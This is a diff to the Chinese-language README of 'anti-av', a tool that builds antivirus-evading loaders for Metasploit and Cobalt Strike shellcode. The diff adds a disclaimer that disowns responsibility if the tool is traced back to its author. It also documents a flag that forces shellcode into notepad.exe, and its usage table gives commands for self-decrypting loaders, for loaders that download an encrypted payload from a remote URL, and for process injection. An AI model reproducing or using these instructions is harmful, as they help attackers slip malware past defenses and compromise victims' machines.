@@ -2,6 +2,12 @@
 
 
 
+## 免责
+
+本工具学习使用，溯源到b1gcat肯定不是我。
+
+
+
 ## 描述
 *shellcode*免杀加载，*payload*支持**msf** (-f raw)和**cs**(payload raw)
 
@@ -42,7 +48,7 @@ Usage of ./anti-av:
         
   -sc string //shellcode的文件或url地址。如果是url，则在运行时访问下载。
         encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading (default "payload.e")
-   -inject //布尔类型，运行时shellcode注入notepad进程。
+  -inject //布尔类型，运行时shellcode注入notepad进程。
         inject payload to notepad.exe       
 
 ```
@@ -53,11 +59,19 @@ Usage of ./anti-av:
 
 
 
-| 形态              | 生成命令                                                     |
-| ----------------- | ------------------------------------------------------------ |
-| 自解密shellcode   | ./anti-av -sc ~/Desktop/payload.bin                          |
-| 远程加载shellcode | 1、./anti-av  -e -sc ~/Desktop/payload.bin    #加密shellcode<br />2、上传payload.e到公共下载服务<br />3、./anti-av -sc http://x.x.x.x/payload.e         #制作加载器 |
-| 注入进程          | under test                                                         |
+| 形态              | 说明                    | 生成命令                                                     |
+| ----------------- | ----------------------- | ------------------------------------------------------------ |
+| 自解密shellcode   | 无                      | ./anti-av -sc ~/Desktop/payload.bin                          |
+| 远程加载shellcode | 无                      | 1、./anti-av  -e -sc ~/Desktop/payload.bin    #加密shellcode<br />2、上传payload.e到公共下载服务<br />3、./anti-av -sc http://x.x.x.x/payload.e         #制作加载器 |
+| 注入进程          | 会强制注入到notepad.exe | ./anti-av -sc ~/Desktop/payload.bin -inject 或<br />./anti-av -sc http://x.x.x.x/payload.e  -inject |
+
+
+
+## 注意
+
+* cs生成raw格式64位 payload，需要勾选x64
+
+  
 
 
 
